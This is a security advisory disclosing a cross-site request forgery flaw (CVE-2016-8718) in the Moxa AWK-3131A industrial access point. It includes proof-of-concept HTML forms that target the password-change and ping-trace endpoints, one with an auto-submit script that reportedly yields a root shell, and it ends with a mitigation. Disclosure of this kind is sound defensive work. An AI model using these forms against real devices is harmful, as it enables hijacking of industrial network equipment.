# Talos Vulnerability Report

### TALOS-2016-0232

## Moxa AWK-3131A Web Application Cross-Site Request Forgery Vulnerability

##### April 10, 2017

##### CVE Number

CVE-2016-8718

### Summary

An exploitable Cross-Site Request Forgery vulnerability exists in the Web Application functionality of Moxa AWK-3131A Wireless Access Point running firmware 1.1. A specially crafted form can trick a client into making an unintentional request to the web server which will be treated as an authentic request.

### Tested Versions

Moxa AWK-3131A Series Industrial IEEE 802.11a/b/g/n wireless AP/bridge/client 1.1

### Product URLs

<http://www.moxa.com/product/AWK-3131A.htm>

### CVSSv3 Score

7.5 - CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H

### Details

An exploitable Cross-Site Request Forgery (CSRF) vulnerability exists in the Web Application functionality of Moxa AWK-3131A Series Industrial IEEE 802.11a/b/g/n wireless AP/bridge/client. A specially crafted form can trick a client into making an unintentional request to the web server which will be treated as an authentic request.

Successful exploitation of this vulnerability can enable an attacker to trick a legitimate user in to performing any action permitted by the device, including exploitation of unrelated vulnerabilities. For example, an attacker may use a CSRF attack to modify device settings or even take advantage of OS Command Injection vulnerabilities to execute operating system commands with root privileges.

### Exploit Proof-of-Concept

The below will change the user’s password to a value determined by the attacker
<html>
<body>
<form action="http://<device IP>/forms/webSetUserChgPwd" method="POST">

</form>

</body>
</html>

Alternatively, leveraging an OS Command Injection vulnerability in conjunction with CSRF, a client which attempts to render the below page will cause a root-level shell to be opened on the vulnerable device:
<html>

<body>
<form action="http://<device IP>/forms/webSetPingTrace" method="POST">

</form>

```
<script>
  		document.forms[0].submit();
	</script>
  		</body>
</html>

```
### Mitigation

To significantly mitigate risk of exploitation, disable the web application before the device is deployed.
